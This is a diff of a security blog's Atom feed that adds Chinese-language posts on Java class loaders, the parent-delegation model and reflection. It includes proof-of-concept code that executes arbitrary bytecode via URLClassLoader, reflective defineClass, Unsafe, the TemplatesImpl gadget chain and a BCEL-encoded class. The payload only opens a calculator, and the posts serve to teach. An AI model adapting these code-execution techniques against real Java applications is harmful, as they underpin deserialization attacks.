@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://www.yyxyy.xyz/</id>
     <title>Yyx</title>
-    <updated>2023-03-19T08:03:57.115Z</updated>
+    <updated>2023-03-19T08:43:30.791Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://www.yyxyy.xyz/"/>
     <link rel="self" href="https://www.yyxyy.xyz/atom.xml"/>
@@ -10,6 +10,571 @@
     <logo>https://www.yyxyy.xyz/images/avatar.png</logo>
     <icon>https://www.yyxyy.xyz/favicon.ico</icon>
     <rights>All rights reserved 2023, Yyx</rights>
+    <entry>
+        <title type="html"><![CDATA[类的动态加载]]></title>
+        <id>https://www.yyxyy.xyz/post/lei-de-dong-tai-jia-zai/</id>
+        <link href="https://www.yyxyy.xyz/post/lei-de-dong-tai-jia-zai/">
+        </link>
+        <updated>2023-06-20T11:42:08.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="类加载器及双亲委派">类加载器及双亲委派</h1>
+<h2 id="类加载器">类加载器</h2>
+<h3 id="作用">作用</h3>
+<p>加载Class文件</p>
+<p>ClassLoader 的工作如图所示 （偷个图)</p>
+<figure data-type="image" tabindex="1"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/JAVA/2.png" alt="img" loading="lazy"></figure>
+<h3 id="启动类加载器bootstrap-classloader"><strong>启动类加载器(Bootstrap ClassLoader):</strong></h3>
+<p>这个类加载器负责将\lib目录下的类库加载到虚拟机内存中,用来加载java的核心库,此类加载器并不继承于java.lang.ClassLoader,不能被java程序直接调用,代码是使用C++编写的.是虚拟机自身的一部分.</p>
+<h3 id="扩展类加载器extendsion-classloader"><strong>扩展类加载器(Extendsion ClassLoader):</strong></h3>
+<p>这个类加载器负责加载\lib\ext目录下的类库,用来加载java的扩展库,开发者可以直接使用这个类加载器.</p>
+<h3 id="应用程序类加载器application-classloader"><strong>应用程序类加载器(Application ClassLoader):</strong></h3>
+<p>这个类加载器负责加载用户类路径(CLASSPATH)下的类库,一般我们编写的java类都是由这个类加载器加载,这个类加载器是CLassLoader中的getSystemClassLoader()方法的返回值,所以也称为系统类加载器.一般情况下这就是系统默认的类加载器.</p>
+<p>除此之外,我们还可以加入自己定义的类加载器,以满足特殊的需求,需要继承java.lang.ClassLoader类.</p>
+<p>类加载器之间的层次关系如下图:</p>
+<figure data-type="image" tabindex="2"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/JAVA/3.png" alt="img" loading="lazy"></figure>
+<h3 id="类加载器的核心方法">类加载器的核心方法</h3>
+<ol>
+<li>loadClass（加载指定的Java类）</li>
+<li>findClass（查找指定的Java类）</li>
+<li>findLoadedClass（查找JVM已经加载过的类）</li>
+<li>defineClass（定义一个Java类）</li>
+<li>resolveClass（链接指定的Java类）</li>
+</ol>
+<h2 id="双亲委派机制">双亲委派机制</h2>
+<h3 id="双亲委派模型过程">双亲委派模型过程</h3>
+<p>双亲委派模型的工作过程为：如果一个类加载器收到了类加载的请求，它首先不会自己去尝试加载这个类，而是把这个请求委派给父类加载器去完成，每一个层次的加载器都是如此，因此所有的类加载请求都会传给顶层的启动类加载器，只有当父加载器反馈自己无法完成该加载请求（该加载器的搜索范围中没有找到对应的类）时，子加载器才会尝试自己去加载。</p>
+<p>使用双亲委派模型的好处在于<strong>Java类随着它的类加载器一起具备了一种带有优先级的层次关系</strong>。例如类java.lang.Object，它存在在rt.jar中，无论哪一个类加载器要加载这个类，最终都是委派给处于模型最顶端的Bootstrap ClassLoader进行加载，因此Object类在程序的各种类加载器环境中都是同一个类。相反，如果没有双亲委派模型而是由各个类加载器自行加载的话，如果用户编写了一个java.lang.Object的同名类并放在ClassPath中，那系统中将会出现多个不同的Object类，程序将混乱。因此，如果开发者尝试编写一个与rt.jar类库中重名的Java类，可以正常编译，但是永远无法被加载运行。</p>
+<h3 id="双亲委派模型的系统实现">双亲委派模型的系统实现</h3>
+<p>在java.lang.ClassLoader的loadClass()方法中，先检查是否已经被加载过，若没有加载则调用父类加载器的loadClass()方法，若父加载器为空则默认使用启动类加载器作为父加载器。如果父加载失败，则抛出ClassNotFoundException异常后，再调用自己的findClass()方法进行加载。</p>
+<pre><code class="language-java">protected synchronized Class&lt;?&gt; loadClass(String name,boolean resolve)throws ClassNotFoundException{
+    //check the class has been loaded or not
+    Class c = findLoadedClass(name);
+    if(c == null){
+        try{
+            if(parent != null){
+                c = parent.loadClass(name,false);
+            }else{
+                c = findBootstrapClassOrNull(name);
+            }
+        }catch(ClassNotFoundException e){
+            //if throws the exception ,the father can not complete the load
+        }
+        if(c == null){
+            c = findClass(name);
+        }
+    }
+    
+    if(resolve){
+        resolveClass(c);
+    }
+    return c;
+}
+</code></pre>
+<p>注意，双亲委派模型是Java设计者推荐给开发者的类加载器的实现方式，并不是强制规定的。大多数的类加载器都遵循这个模型，但是JDK中也有较大规模破坏双亲模型的情况，例如线程上下文类加载器（Thread Context ClassLoader）的出现，具体分析可以参见周志明著《深入理解Java虚拟机》。</p>
+<h1 id="各场景下代码块加载顺序">各场景下代码块加载顺序</h1>
+<h2 id="代码块">代码块</h2>
+<ul>
+<li>
+<ul>
+<li>静态代码块：static{}</li>
+<li>构造代码块：{}</li>
+<li>无参构造器：ClassName()</li>
+<li>有参构造器：ClassName(String name)</li>
+</ul>
+</li>
+</ul>
+<h2 id="各种场景">各种场景</h2>
+<p>参考：<a href="https://drun1baby.github.io/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/#toc-heading-11">https://drun1baby.github.io/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/#toc-heading-11</a></p>
+<h2 id="动态加载字节码">动态加载字节码</h2>
+<h3 id="字节码的概念">字节码的概念</h3>
+<p>Java 字节码（ByteCode）其实仅仅指的是 Java 虚拟机执行使用的一类指令，通常被存储在 .class 文件中。</p>
+<p>如图:</p>
+<figure data-type="image" tabindex="3"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/JAVA/4.png" alt="img" loading="lazy"></figure>
+<h3 id="类加载器的原理">类加载器的原理</h3>
+<p>流程:</p>
+<p>ClassLoader —-&gt; SecureClassLoader —&gt; URLClassLoader —-&gt; APPClassLoader —-&gt; loadClass() —-&gt; findClass()</p>
+<h3 id="利用-urlclassloader-加载远程-class-文件">利用 URLClassLoader 加载远程 class 文件</h3>
+<p>正常情况下，Java会根据配置项 sun.boot.class.path 和 java.class.path 中列举到的基础路径（这些路径是经过处理后的 java.net.URL 类）来寻找.class文件来加载，而这个基础路径有分为三种情况：</p>
+<p>①：URL未以斜杠 / 结尾，则认为是一个JAR文件，使用 JarLoader 来寻找类，即为在Jar包中寻找.class文件</p>
+<p>②：URL以斜杠 / 结尾，且协议名是 file ，则使用 FileLoader 来寻找类，即为在本地文件系统中寻找.class文件</p>
+<p>③：URL以斜杠 / 结尾，且协议名不是 file ，则使用最基础的 Loader 来寻找类。</p>
+<h4 id="file协议">file协议</h4>
+<p>javac Calc.java。将class文件移动到桌面。</p>
+<pre><code class="language-plain">package org.example;
+import java.io.IOException;
+
+// URLClassLoader 的 file 协议
+public class Calc {
+    static {
+        try {
+            Runtime.getRuntime().exec(&quot;deepin-calculator&quot;);
+        } catch (IOException e){
+            e.printStackTrace();
+        }
+    }
+}
+</code></pre>
+<p>编写UrlClassLoader。</p>
+<pre><code class="language-plain">package org.example;
+
+import java.net.URL;
+import java.net.URLClassLoader;
+
+// URLClassLoader 的 file 协议
+public class FileRce {
+    public static void main(String[] args) throws Exception {
+        URLClassLoader urlClassLoader = new URLClassLoader
+                (new URL[]{new URL(&quot;file:////home//admin//Desktop//&quot;)});
+        Class calc = urlClassLoader.loadClass(&quot;org.example.Calc&quot;);
+        calc.newInstance();
+    }
+}
+</code></pre>
+<p>弹出计算器</p>
+<figure data-type="image" tabindex="4"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/JAVA/5.png" alt="img" loading="lazy"></figure>
+<h4 id="http-协议">HTTP 协议</h4>
+<p>在class文件下面用python -m http.server 9999起一个服务。</p>
+<pre><code class="language-plain">package org.example;
+
+import java.net.URL;
+import java.net.URLClassLoader;
+
+// URLClassLoader 的 file 协议
+public class FileRce {
+    public static void main(String[] args) throws Exception {
+        URL url = new URL(&quot;http://127.0.0.1:9999/&quot;);
+        URLClassLoader loader = new URLClassLoader(new URL[]{url});
+        Class clazz = loader.loadClass(&quot;org.example.Calc&quot;);
+        clazz.newInstance();
+    }
+}
+</code></pre>
+<p>弹出计算器</p>
+<figure data-type="image" tabindex="5"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/JAVA/6.png" alt="img" loading="lazy"></figure>
+<h4 id="filejar-协议">file+jar 协议</h4>
+<p>jar -cvf Calc.jar Clac.class  打包jar包</p>
+<pre><code class="language-plain">package org.example;
+
+import java.net.URL;
+import java.net.URLClassLoader;
+
+// URLClassLoader 的 file 协议
+public class FileRce {
+    public static void main(String[] args) throws Exception {
+        URL url = new URL(&quot;jar:file:////home//admin//Desktop//Calc.jar!/&quot;);
+        URLClassLoader loader = new URLClassLoader(new URL[]{url});
+        Class clazz = loader.loadClass(&quot;org.example.Calc&quot;);
+        clazz.newInstance();
+    }
+}
+</code></pre>
+<p>弹出计算器</p>
+<figure data-type="image" tabindex="6"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/JAVA/7.png" alt="img" loading="lazy"></figure>
+<h4 id="http-jar-协议">HTTP + jar 协议</h4>
+<p>python 起一个服务</p>
+<pre><code class="language-plain">package org.example;
+
+import java.net.URL;
+import java.net.URLClassLoader;
+
+// URLClassLoader 的 file 协议
+public class FileRce {
+    public static void main(String[] args) throws Exception {
+        URL url = new URL(&quot;jar:http://127.0.0.1:9999/Calc.jar!/&quot;);
+        URLClassLoader loader = new URLClassLoader(new URL[]{url});
+        Class clazz = loader.loadClass(&quot;org.example.Calc&quot;);
+        clazz.newInstance();
+    }
+}
+</code></pre>
+<p>弹出计算器</p>
+<figure data-type="image" tabindex="7"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/JAVA/8.png" alt="img" loading="lazy"></figure>
+<h3 id="利用-classloaderdefineclass-直接加载字节码">利用 ClassLoader#defineClass 直接加载字节码</h3>
+<p>不管是加载远程 class 文件，还是本地的 class 或 jar 文件，Java 都经历的是下面这三个方法调用。</p>
+<figure data-type="image" tabindex="8"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/JAVA/9.png" alt="img" loading="lazy"></figure>
+<ul>
+<li>loadClass() 的作用是从已加载的类、父加载器位置寻找类（即双亲委派机制），在前面没有找到的情况下，调用当前ClassLoader的findClass()方法；</li>
+<li>findClass() 根据URL指定的方式来加载类的字节码，其中会调用defineClass()；</li>
+<li>defineClass 的作用是处理前面传入的字节码，将其处理成对应的 Class 对象</li>
+</ul>
+<p>所以可见，真正核心的部分其实是 defineClass ，他决定了如何将一段字节流转变成一个Java类，Java默认的 ClassLoader#defineClass 是一个 native 方法，逻辑在 JVM 的C语言代码中。</p>
+<p>defineClass方法调用如下。</p>
+<p>name为类名，b为字节码数组，off为偏移量，len为字节码数组的长度。</p>
+<pre><code class="language-java">protected final Class&lt;?&gt; defineClass(String name, byte[] b, int off, int len);
+</code></pre>
+<p>因为系统的 ClassLoader#defineClass 是一个保护属性，所以我们无法直接在外部访问。因此可以反射调用 defineClass() 方法进行字节码的加载，然后实例化之后即可弹 shell</p>
+<p>首先需要获取 ClassLoader, 以下是常用几种获取 ClassLoader 的方式</p>
+<pre><code class="language-java">ClassLoader loader = Thread.currentThread().getContextClassLoader();
+ClassLoader loader = ClassLoader.getSystemClassLoader();
+ClassLoader loader = this.getClass().getClassLoader();
+</code></pre>
+<p>payload</p>
+<pre><code class="language-plain">package org.example;
+
+import java.lang.reflect.Method;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+
+// 利用 ClassLoader#defineClass 直接加载字节码
+public class define {
+    public static void main(String[] args) throws Exception{
+        ClassLoader classLoader = ClassLoader.getSystemClassLoader();
+        Method method = ClassLoader.class.getDeclaredMethod(&quot;defineClass&quot;, String.class, byte[].class, int.class, int.class);
+        method.setAccessible(true);
+        byte[] code = Files.readAllBytes(Paths.get(&quot;/home/admin/Desktop/Calc.class&quot;)); // 字节码的数组
+        //System.out.println(code);
+        Class c = (Class) method.invoke(classLoader, &quot;org.example.Calc&quot;, code, 0, code.length);
+        c.newInstance();
+    }
+}
+</code></pre>
+<figure data-type="image" tabindex="9"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/JAVA/10.png" alt="img" loading="lazy"></figure>
+<h3 id="unsafe-加载字节码">Unsafe 加载字节码</h3>
+<ul>
+<li>Unsafe中也存在defineClass()方法，本质上也是 defineClass 加载字节码的方式。</li>
+</ul>
+<p>虽然是public方法但是还是无法直接调用，需要反射调用</p>
+<pre><code class="language-plain">package org.example;
+
+import sun.misc.Unsafe;
+
+import java.lang.reflect.Field;
+import java.lang.reflect.Method;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.security.ProtectionDomain;
+
+public class UnsafeClassLoaderRce {
+    public static void main(String[] args) throws Exception{
+        ClassLoader classLoader = ClassLoader.getSystemClassLoader();
+        Class&lt;Unsafe&gt; unsafeClass = Unsafe.class;
+        Field unsafeField = unsafeClass.getDeclaredField(&quot;theUnsafe&quot;);
+        unsafeField.setAccessible(true);
+        Unsafe classUnsafe = (Unsafe) unsafeField.get(null);
+        Method defineClassMethod = unsafeClass.getMethod(&quot;defineClass&quot;, String.class, byte[].class,
+                int.class, int.class, ClassLoader.class, ProtectionDomain.class);
+        byte[] code = Files.readAllBytes(Paths.get(&quot;/home/admin/Desktop/Calc.class&quot;));
+        Class calc = (Class) defineClassMethod.invoke(classUnsafe, &quot;Calc&quot;, code, 0, code.length, classLoader, null);
+        calc.newInstance();
+    }
+}
+</code></pre>
+<figure data-type="image" tabindex="10"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/JAVA/11.png" alt="img" loading="lazy"></figure>
+<h3 id="templatesimpl-加载字节码">TemplatesImpl 加载字节码</h3>
+<p>因为 defineClass 的作用域往往都是不开放的, 攻击者一般很难利用到它, 所以接下来我们引入 TemplatesImpl 这条非常重要的利用链, 它是各大反序列化链 (cc, rome, fastjson) 利用的基础</p>
+<p>TemplatesImpl 的全类名是 com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl, 其内部实现了一个TransletClassLoader</p>
+<p>TransletClassLoader这个类继承了classloader，并且重写了defineClass。</p>
+<figure data-type="image" tabindex="11"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/JAVA/12.png" alt="img" loading="lazy"></figure>
+<pre><code class="language-plain">Class defineClass(final byte[] b) {
+    return defineClass(null, b, 0, b.length);
+}
+</code></pre>
+<p>可以看到 TransletClassLoader 的 defineClass 方法没有访问修饰符, 这样的话它的作用域就为包作用域, 即可以在同一个包内被调用</p>
+<p>据此在 TemplatesImpl 内部寻找调用 defineClass 的方法</p>
+<figure data-type="image" tabindex="12"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/JAVA/13.png" alt="img" loading="lazy"></figure>
+<p>往上走TemplatesImpl的defineTransletClasses方法</p>
+<figure data-type="image" tabindex="13"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/JAVA/14.png" alt="img" loading="lazy"></figure>
+<p>再往上TemplatesImpl的getTransletInstance方法</p>
+<p>这里getTransletClasses 和 getTransletIndex 虽然都调用了 defineTransletClasses , 但是它们在调用之后并没有进行任何操作, 那么最终被加载的类就无法初始化/实例化, 不符合要求</p>
+<figure data-type="image" tabindex="14"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/JAVA/15.png" alt="img" loading="lazy"></figure>
+<p>再往上TemplatesImpl的newTransformer方法，此时已经是public方法了外面可以直接调用，不需要再继续网上跟了</p>
+<figure data-type="image" tabindex="15"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/JAVA/16.png" alt="img" loading="lazy"></figure>
+<p>因此我们得到了一条完整的利用链</p>
+<pre><code class="language-plain">TemplatesImpl#getOutputProperties() -&gt;
+TemplatesImpl#newTransformer() -&gt; 
+TemplatesImpl#getTransletInstance() -&gt; 
+TemplatesImpl#defineTransletClasses() -&gt; 
+TransletClassLoader#defineClass()
+</code></pre>
+<p>尝试用 TemplatesImpl#newTransformer() 构造一个简单的 POC</p>
+<pre><code class="language-plain">package org.example;
+
+import com.sun.org.apache.xalan.internal.xsltc.DOM;
+import com.sun.org.apache.xalan.internal.xsltc.TransletException;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+
+import java.io.IOException;
+
+// TemplatesImpl 的字节码构造
+public class TemplatesBytes extends AbstractTranslet {
+    public void transform(DOM dom, SerializationHandler[] handlers) throws TransletException{}
+    public void transform(DOM dom, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException{}
+    public TemplatesBytes() throws IOException{
+        super();
+        Runtime.getRuntime().exec(&quot;deepin-calculator&quot;);
+    }
+}
+</code></pre>
+<p>这里的字节码必须继承AbstractTranslet，因为继承了这一抽象类，所以必须要重写一下里面的方法。</p>
+<p>POC</p>
+<pre><code class="language-plain">package org.example;
+
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+
+import java.lang.reflect.Field;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+
+// 主程序
+public class TemplatesRce {
+    public static void main(String[] args) throws Exception{
+        byte[] code = Files.readAllBytes(Paths.get(&quot;/home/admin/Desktop/TemplatesBytes.class&quot;));
+        TemplatesImpl templates = new TemplatesImpl();
+        setFieldValue(templates, &quot;_name&quot;, &quot;Calc&quot;);
+        setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][] {code});
+        setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());
+        templates.newTransformer();
+    }
+//其中setFieldValue是利用反射给私有变量赋值如下
+    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception{
+        Field field = obj.getClass().getDeclaredField(fieldName);
+        field.setAccessible(true);
+        field.set(obj, value);
+    }
+}
+</code></pre>
+<p>定义了一个设置私有属性的方法，命名为 setFieldValue，根据我们的链子，一个个看</p>
+<pre><code class="language-plain">TemplatesImpl#getOutputProperties() -&gt;
+TemplatesImpl#newTransformer() -&gt;
+TemplatesImpl#getTransletInstance() -&gt;
+TemplatesImpl#defineTransletClasses() -&gt;
+TransletClassLoader#defineClass()
+</code></pre>
+<p>主要三个私有类属性</p>
+<pre><code class="language-plain">setFieldValue(templates, &quot;_name&quot;, &quot;Calc&quot;); 
+</code></pre>
+<figure data-type="image" tabindex="16"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/JAVA/17.png" alt="img" loading="lazy"></figure>
+<p>这里的_name不能为null。继续跟进defineTransletClasses</p>
+<figure data-type="image" tabindex="17"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/JAVA/18.png" alt="img" loading="lazy"></figure>
+<p>这里_bytecodes不能为null。</p>
+<p>_tfactory 需要是一个 TransformerFactoryImpl 对象，因为 TemplatesImpl#defineTransletClasses() 方法里有调用到 _tfactory.getExternalExtensionsMap() ，如果是 null 会出错。</p>
+<p>弹计算器成功</p>
+<figure data-type="image" tabindex="18"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/JAVA/19.png" alt="img" loading="lazy"></figure>
+<h3 id="利用-bcel-classloader-加载字节码">利用 BCEL ClassLoader 加载字节码</h3>
+<p>概念:</p>
+<p>BCEL 的全名应该是 Apache Commons BCEL，属于Apache Commons项目下的一个子项目，但其因为被 Apache Xalan 所使用，而 Apache Xalan 又是 Java 内部对于 JAXP 的实现，所以 BCEL 也被包含在了 JDK 的原生库中。</p>
+<p>我们可以通过 BCEL 提供的两个类 Repository 和 Utility 来利用： Repository 用于将一个Java Class 先转换成原生字节码，当然这里也可以直接使用javac命令来编译 java 文件生成字节码； Utility 用于将原生的字节码转换成BCEL格式的字节码：</p>
+<p>生成对应BCEL格式的字节码</p>
+<pre><code class="language-plain">package org.example;
+
+import com.sun.org.apache.bcel.internal.Repository;
+import com.sun.org.apache.bcel.internal.classfile.JavaClass;
+import com.sun.org.apache.bcel.internal.classfile.Utility;
+
+public class BcelDemo {
+    public static void main(String[] args) throws Exception{
+        Class calc = Class.forName(&quot;org.example.Calc&quot;);
+        JavaClass cls = Repository.lookupClass(calc);
+        String code = Utility.encode(cls.getBytes(), true);
+        System.out.println(code);
+    }
+}
+</code></pre>
+<figure data-type="image" tabindex="19"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/JAVA/20.png" alt="img" loading="lazy"></figure>
+<p>通过 com.sun.org.apache.bcel.internal.util.ClassLoader 加载 class</p>
+<pre><code class="language-plain">package org.example;
+
+import com.sun.org.apache.bcel.internal.util.ClassLoader;
+
+public class BcelRce {
+    public static void main(String[] args) throws Exception {
+        String exp=&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmQMO$db$40$Q$7d$9b8$b1c$9c$G$C$e1$bb$e5$ab$85$80$E$bep$DqA$m$nLA$N$82$f3fY$85$F$c7$b6$9cM$95$7f$d43$XZq$e8$P$e8$8fB$cc$$$81$a2$WK$de$99y3$ef$cd$cc$ee$9f$c7$87$df$A$b6$b1$ea$c3$c3$94$8fi$ccx$985v$ce$c5$bc$8f$S$3e$ba$f8$e4b$81$a1$bc$ab$S$a5$f7$Y$8a$cd$f5$L$Gg$3f$bd$92$M$b5H$r$f2k$bf$db$96$f99o$c7$84$d4$a3T$f0$f8$82$e7$ca$c4C$d0$d1$d7$aagsy$t$94$D$de$cdb$Z$ee$f3X$ec0x$bb$o$kJ3$wmD7$fc$3b$PU$g$k$9d$k$M$84$cc$b4J$T$w$ab$b64$X$b7$t$3c$b3$924$j$83$dfJ$fb$b9$90$87$ca$b4$a8$Y$b9$z$c3$NP$81$efb1$c0$S$96$Z$c6$ae$a4$ccT$b2IS$89$7e$ccu$9a$HX$c1g$86$f1w$g$F$f8$C$9fa$f4$df9$J$b2$d51O$3a$e1i$fbF$KM$ca$7f$a1o$fdD$ab$$$8d$e1w$a4$7e$N$g$cd$f5$e8$bf$g$da$c5$91$DI$92k$cd7$d9$96$ceU$d2$d9yK8$cbS$n$7b$3d$o$d42Jj$7b$D$e79$X$926s$e9$c5$ccW$A3$fb$d29BQH$96$91$zm$fc$E$bb$b3$e9$80$ce$f23$88$w$9d$c1$d0$ff$80$gY$P$a3$afdn$c5$80$fa$_$U$ea$c5$7b8$97$3f$e0$jo$dc$a3$7cg$f1$KqK$uZ$c5I$f2$M$bbBLs$e1UR$Z$p$ef$a5C$V$O$c5u$8a$c6$e9wQ$88$5cL8$94h$d8$a1$s$9f$Asme$a1$7b$C$A$A&quot;;
+        ClassLoader loader = new ClassLoader();
+        Class clazz = loader.loadClass(exp);
+        clazz.newInstance();
+    }
+}
+</code></pre>
+<figure data-type="image" tabindex="20"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/JAVA/21.png" alt="img" loading="lazy"></figure>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[动态代理]]></title>
+        <id>https://www.yyxyy.xyz/post/dong-tai-dai-li/</id>
+        <link href="https://www.yyxyy.xyz/post/dong-tai-dai-li/">
+        </link>
+        <updated>2022-04-26T12:18:34.000Z</updated>
+        <content type="html"><![CDATA[<p>参考：<br>
+https://www.liaoxuefeng.com/wiki/1252599548343744/1264804593397984</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[反射学习]]></title>
+        <id>https://www.yyxyy.xyz/post/fan-she-xue-xi/</id>
+        <link href="https://www.yyxyy.xyz/post/fan-she-xue-xi/">
+        </link>
+        <updated>2022-03-23T02:16:00.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="反射概念">反射概念</h1>
+<p>Java反射机制是在运行状态时，对于任意一个类，都能够获取到这个类的所有属性和方法，对于任意一个对象，都能够调用它的任意一个方法和属性(包括私有的方法和属性)，这种动态获取的信息以及动态调用对象的方法的功能就称为java语言的反射机制。</p>
+<p>简单讲让其具有动态特性。</p>
+<p>动态特性即⼀段代码，改变其中的变量，将会导致 这段代码产⽣功能性的变化，我称之为动态特性。</p>
+<h1 id="java-常用的方法">JAVA 常用的方法</h1>
+<p>获取类的⽅法： forName</p>
+<p>实例化类对象的⽅法： newInstance</p>
+<p>获取函数的⽅法： getMethod</p>
+<p>执⾏函数的⽅法： invoke</p>
+<pre><code class="language-java">public void execute(String className, String methodName) throws Exception {
+    Class clazz = Class.forName(className); 
+    clazz.getMethod(methodName).invoke(clazz.newInstance()); 
+}
+</code></pre>
+<h1 id="java-反射组成相关的类">Java 反射组成相关的类</h1>
+<p>反射机制相关操作一般位于java.lang.reflect包中。</p>
+<p>而java反射机制组成需要重点注意以下的类：</p>
+<p>java.lang.Class：类对象;</p>
+<p>java.lang.reflect.Constructor：类的构造器对象;</p>
+<p>java.lang.reflect.Field：类的属性对象;</p>
+<p>java.lang.reflect.Method：类的方法对象;</p>
+<h1 id="反射的简单使用">反射的简单使用</h1>
+<h2 id="1实例化对象">1.实例化对象</h2>
+<p>JVM为每个加载的class创建了对应的Class实例，并在实例中保存了该class的所有信息；因此，如果获取了某个Class实例，我们就可以通过这个Class实例获取到该实例对应的class的所有信息</p>
+<h3 id="0x01-直接通过一个class的静态变量class获取">0x01 直接通过一个class的静态变量class获取：</h3>
+<pre><code class="language-java">Class c = String.class;
+</code></pre>
+<h3 id="0x02-通过该实例变量提供的getclass方法获取">0x02 通过该实例变量提供的getClass()方法获取:</h3>
+<pre><code class="language-java">String s = &quot;test&quot;;
+Class c = s.getClass();
+</code></pre>
+<h3 id="0x03-知道一个class的完整类名可以通过静态方法classforname获取">0x03 知道一个class的完整类名，可以通过静态方法Class.forName()获取</h3>
+<pre><code class="language-java">Class c = Class.forName(&quot;java.lang.String&quot;);
+</code></pre>
+<p>由于Class实例在JVM中是唯一的，所以，上述方法获取的Class实例是同一个实例.</p>
+<h2 id="2获取成员变量-field">2.获取成员变量 Field</h2>
+<p>获取成员变量Field位于 java.lang.reflect.Field 包中</p>
+<p>Field[] getFields() ：获取所有 public 修饰的成员变量，包括父类中的变量。</p>
+<p>Field[] getDeclaredFields() 获取所有的成员变量，即包括public、private和proteced，但是不包括父类的申明变量。</p>
+<p>Field getField(String name) 获取指定名称的 public 修饰的成员变量</p>
+<p>Field getDeclaredField(String name) 获取指定的成员变量</p>
+<pre><code class="language-java">package ysoserial.mytest;
+
+import java.lang.reflect.Field;
+
+public class test {
+    public static void main(String[] args) throws Exception {
+        Class stiClass = StuInfo.class;
+        // 获取public字段&quot;age&quot;:
+        System.out.println(stiClass.getField(&quot;age&quot;));
+        // 获取继承的public字段&quot;name&quot;:
+        System.out.println(stiClass.getField(&quot;name&quot;));
+        // 获取private字段&quot;money&quot;:
+        System.out.println(stiClass.getDeclaredField(&quot;money&quot;));
+        // 获得值,name.get里面参数需要该类对象，而不是.class
+        Field name = stiClass.getField(&quot;name&quot;);
+        System.out.println(name.get(stiClass.newInstance()));
+        // 设置值
+        StuInfo stuInfo = new StuInfo();
+        Field money = stiClass.getDeclaredField(&quot;money&quot;);
+        money.setAccessible(true);
+        money.set(stuInfo,2);
+        System.out.println(stuInfo);
+
+
+
+
+    }
+}
+
+class StuInfo extends PersonInfo{
+    public int age;
+    private int money;
+
+    @Override
+    public String toString() {
+        return &quot;StuInfo{&quot; +
+            &quot;name=&quot; + name +
+            &quot;, money=&quot; + money +
+            '}';
+    }
+}
+
+class PersonInfo{
+    public String name = &quot;test&quot;;
+}
+</code></pre>
+<h2 id="3-获取成员方法-method">3. 获取成员方法 Method</h2>
+<p>Class类提供了以下几个方法来获取Method：</p>
+<ul>
+<li>Method getMethod(name, Class...)：获取某个public的Method（包括父类）</li>
+<li>Method getDeclaredMethod(name, Class...)：获取当前类的某个Method（不包括父类）</li>
+<li>Method[] getMethods()：获取所有public的Method（包括父类）</li>
+<li>Method[] getDeclaredMethods()：获取当前类的所有Method（不包括父类）</li>
+</ul>
+<h3 id="通过反射来使用substring">通过反射来使用substring</h3>
+<pre><code class="language-java">String name = &quot;test123&quot;;
+Method substring = String.class.getMethod(&quot;substring&quot;, int.class);
+System.out.println(substring.invoke(name,3));
+</code></pre>
+<h3 id="调用的方法是静态方法-那么invoke方法传入的第一个参数永远为null">调用的方法是静态方法。那么invoke方法传入的第一个参数永远为null</h3>
+<pre><code class="language-java">// 获取Integer.parseInt(String)方法，参数为String:
+Method m = Integer.class.getMethod(&quot;parseInt&quot;, String.class);
+// 调用该静态方法并获取结果:
+Integer n = (Integer) m.invoke(null, &quot;23333&quot;);
+System.out.println(n);
+</code></pre>
+<h2 id="4获取构造函数-constructor">4.获取构造函数 Constructor</h2>
+<p>通过Class实例获取Constructor的方法如下：</p>
+<pre><code class="language-java">getConstructor(Class...)：获取某个public的Constructor；
+getDeclaredConstructor(Class...)：获取某个Constructor；
